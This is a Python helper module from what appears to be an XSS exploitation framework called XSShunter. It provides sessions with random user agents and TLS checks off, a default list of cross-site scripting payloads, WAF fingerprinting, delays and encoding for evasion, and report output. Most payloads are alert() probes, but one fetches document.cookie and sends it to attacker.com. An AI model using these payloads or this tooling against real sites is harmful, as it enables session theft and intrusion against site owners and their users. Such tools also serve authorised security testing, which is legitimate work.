#!/usr/bin/env python3
# XSShunter - Advanced XSS Exploitation Framework
# Copyright (C) 2026  3rabDev
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

import requests
import json
import os
import random
import time
from fake_useragent import UserAgent
from colorama import Fore, Style, init

init(autoreset=True)
ua = UserAgent()

def get_session(cookie=None, proxy=None, timeout=15, retries=3):
    session = requests.Session()
    session.headers.update({
        'User-Agent': ua.random,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Cache-Control': 'max-age=0'
    })
    if cookie:
        if isinstance(cookie, str):
            session.cookies.update({'cookie': cookie})
        else:
            session.cookies.update(cookie)
    if proxy:
        session.proxies.update({'http': proxy, 'https': proxy})
    session.verify = False
    session.max_redirects = 10
    return session

def load_payloads(file_path="core/payloads.txt", extra_path=None):
    payloads = set()
    default_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "\"><script>alert(1)</script>",
        "javascript:alert('XSS')",
        "'><svg/onload=alert(1)>",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<iframe src=javascript:alert(1)>",
        "<svg/onload=alert(1)>",
        "';alert(String.fromCharCode(88,83,83))//",
        "\"-alert(1)-\"",
        "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
        "<details/open/ontoggle=alert(1)>",
        "<svg><script>alert(1)</script>",
        "<img src=x:x onerror=alert(1)>",
        "\"><img src=x onerror=alert(1)>",
        "'><img src=x onerror=alert(1)>",
        "></script><script>alert(1)</script>",
        "<BODY ONLOAD=alert('XSS')>",
        "<svg/onload=prompt(1)>",
        "<svg/onload=confirm(1)>"
    ]
    if os.path.exists(file_path):
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    payloads.add(line)
    if extra_path and os.path.exists(extra_path):
        with open(extra_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    payloads.add(line)
    if not payloads:
        payloads.update(default_payloads)
    return list(payloads)

def save_report(findings, output_file, format='json'):
    os.makedirs(os.path.dirname(os.path.abspath(output_file)) if os.path.dirname(output_file) else '.', exist_ok=True)
    if format == 'json':
        report = {
            "scanner": "XSShunter",
            "version": "1.0",
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "total_findings": len(findings),
            "findings": findings
        }
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=4, ensure_ascii=False)
    elif format == 'html':
        html_template = f"""<!DOCTYPE html>
<html>
<head><title>XSShunter Report</title><style>
body {{ font-family: Arial; margin: 20px; background: #1e1e1e; color: #ddd; }}
h1 {{ color: #ff4444; }}
table {{ border-collapse: collapse; width: 100%; }}
th, td {{ border: 1px solid #444; padding: 8px; text-align: left; }}
th {{ background: #333; }}
tr:nth-child(even) {{ background: #2a2a2a; }}
.payload {{ font-family: monospace; color: #ffaa00; }}
</style></head>
<body>
<h1>XSShunter Scan Report</h1>
<p>Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
<p>Total Findings: {len(findings)}</p>
<table>
<tr><th>URL</th><th>Parameter</th><th>Payload</th><th>Type</th><th>Context</th></tr>
"""
        for f in findings:
            html_template += f"<tr><td>{f.get('url','')}</td><td>{f.get('parameter','')}</td><td class='payload'>{f.get('payload','')}</td><td>{f.get('type','')}</td><td>{f.get('context','')}</td></tr>"
        html_template += "</table></body></html>"
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(html_template)
    elif format == 'txt':
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(f"XSShunter Report - {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("="*60 + "\n")
            for idx, finding in enumerate(findings, 1):
                f.write(f"\n[{idx}] URL: {finding.get('url')}\n")
                f.write(f"    Parameter: {finding.get('parameter')}\n")
                f.write(f"    Payload: {finding.get('payload')}\n")
                f.write(f"    Type: {finding.get('type')}\n")
                f.write(f"    Context: {finding.get('context')}\n")
                f.write("-"*40 + "\n")
    else:
        raise ValueError("Unsupported format")

def detect_waf(response):
    waf_signatures = {
        'Cloudflare': ['cloudflare', '__cfduid', 'cf-ray'],
        'ModSecurity': ['mod_security', 'modsecurity', 'NOYB'],
        'Sucuri': ['sucuri', 'x-sucuri-id'],
        'Barracuda': ['barracuda', 'barra_counter'],
        'F5 Big-IP': ['bigip', 'f5', 'x-cnection'],
        'Akamai': ['akamai', 'akamai-host'],
        'Imperva': ['incapsula', 'imperva', 'x-iinfo'],
        'Fortinet': ['fortigate', 'fortinet'],
        'AWS WAF': ['aws', 'x-amzn-requestid'],
        'Wordfence': ['wordfence', 'wf_'],
        'Nexus': ['nexus'],
        'StackPath': ['stackpath', 'sw-cache']
    }
    headers = {k.lower(): v.lower() for k, v in response.headers.items()}
    for waf_name, signatures in waf_signatures.items():
        for sig in signatures:
            if sig.lower() in str(headers) or sig.lower() in response.text.lower():
                return waf_name
    return None

def color_print(message, level="info", end='\n'):
    styles = {
        "info": Fore.CYAN,
        "success": Fore.GREEN,
        "error": Fore.RED,
        "warning": Fore.YELLOW,
        "critical": Fore.MAGENTA + Style.BRIGHT,
        "header": Fore.BLUE + Style.BRIGHT
    }
    prefix = {
        "info": "[*]",
        "success": "[+]",
        "error": "[-]",
        "warning": "[!]",
        "critical": "[!!!]",
        "header": "[>]"
    }
    color = styles.get(level, Fore.WHITE)
    pre = prefix.get(level, "[*]")
    print(f"{color}{pre} {message}{Style.RESET_ALL}", end=end)

def random_delay(min_sec=0.1, max_sec=0.5):
    time.sleep(random.uniform(min_sec, max_sec))

def encode_payload(payload, method='url'):
    from urllib.parse import quote
    if method == 'url':
        return quote(payload)
    elif method == 'double_url':
        return quote(quote(payload))
    elif method == 'html_entity':
        import html
        return html.escape(payload)
    return payload